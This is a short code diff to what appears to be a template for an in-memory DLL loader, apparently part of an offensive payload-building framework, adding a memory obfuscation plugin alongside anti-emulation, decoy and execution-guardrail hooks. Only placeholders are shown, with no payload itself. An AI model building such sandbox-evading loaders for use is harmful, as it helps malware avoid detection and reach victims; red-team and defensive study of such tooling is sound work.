@@ -150,6 +150,8 @@ DWORD_PTR load_dll(LPVOID dllBytes, DWORD_PTR *ret_dllBase, DWORD *ret_aoep) {
 
 {{plugin_executionguardrail}}
 
+{{plugin_memoryobfuscation}}
+
 {{plugin_virtualprotect}}
 
 int main()
@@ -163,6 +165,9 @@ int main()
 
 	// Call: Anti Emulation plugin
 	antiemulation();
+
+	// Call: Memory Obfuscation plugin
+        memoryobfuscation();
 
 	// Call: Decoy plugin
 	decoy();
